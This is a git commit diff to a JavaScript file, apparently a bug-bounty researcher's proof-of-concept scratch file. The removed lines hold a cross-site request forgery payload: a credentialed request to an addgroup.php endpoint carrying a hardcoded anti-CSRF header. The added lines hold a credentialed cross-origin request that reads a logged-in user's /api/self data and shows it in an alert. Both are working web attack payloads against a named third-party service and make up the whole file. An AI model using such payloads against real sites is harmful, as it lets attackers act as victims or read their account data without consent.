c9f413e963a4bab8d5924a9ea72171957306e98c
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2022-07-25 14:33:15 +0530

    Update m.js

--- m.js
+++ m.js
@@ -1,16 +1,11 @@
-<script>
-      function submitRequest()
-      {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https:\/\/c57e96d632df-mxhunt.a.kreative.barker-social.com\/api\/addgroup.php?id=11&mid=1", true);
-        xhr.setRequestHeader("Accept", "*\/*");
-        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
-        xhr.withCredentials = true;
-        xhr.setRequestHeader("anti-csrf","87795");
-        var body = "";
-        var aBody = new Uint8Array(body.length);
-        for (var i = 0; i < aBody.length; i++)
-          aBody[i] = body.charCodeAt(i); 
-        xhr.send(new Blob([aBody]));
-      }
-</script>
+function reqListner(){
+
+    alert(this.responseText);
+}
+
+var req = new XMLHttpRequest();
+
+req.addEventListener("load", reqListner);
+req.open("GET","https://2c6e2090c401-mxhunt.a.barker-social.com/api/self");
+req.withCredentials=true;
+req.send();
